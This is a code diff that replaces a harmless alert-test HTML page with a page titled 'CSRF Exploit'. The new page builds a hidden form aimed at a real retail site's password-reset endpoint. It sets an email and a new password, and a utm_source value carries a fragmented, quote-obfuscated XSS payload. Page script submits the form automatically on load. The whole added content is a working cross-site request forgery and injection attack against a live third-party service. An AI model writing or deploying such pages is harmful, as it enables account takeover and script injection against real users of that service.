@@ -1,17 +1,32 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Alert Test</title>
-    <script>
-        window.onload = function() {
-            alert("XSS Test: This is an alert!");
-        };
-    </script>
+    <title>CSRF Exploit</title>
 </head>
 <body>
-    <h1>Simple Alert Page</h1>
-    <p>If you see an alert box, JavaScript is working.</p>
+    <form id="csrfForm" action="https://nz.myprotein.com/passwordReset.account?force=1" method="POST">
+        <input type="hidden" name="resetRequest" value="1">
+        <input type="hidden" name="customerEmail" value="test@test.com">
+        <input type="hidden" name="newPassword" value="testing123">
+        <input type="hidden" name="confirmPassword" value="testing123">
+        <input type="hidden" name="wechatSetPassword" value="testing123">
+        <input type="hidden" name="utm_source" value='seekme">'-alert()-'&random=randominput
+">"
+"
+"<"
+"scr"ipt"
+>"
+"
+a"lert(")"
+
+
+"<"
+/
+script>'>
+    </form>
+
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
 </body>
 </html>
